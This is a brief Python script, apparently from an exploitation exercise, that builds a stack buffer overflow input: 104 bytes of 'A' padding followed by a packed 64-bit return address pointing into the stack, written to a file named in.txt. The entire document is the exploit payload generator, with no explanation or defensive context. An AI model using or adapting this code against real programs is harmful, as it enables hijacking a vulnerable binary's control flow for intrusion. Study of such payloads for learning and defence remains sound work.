#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q", 0x7fffffffe5bf)

f = open("in.txt","w")
f.write(buf)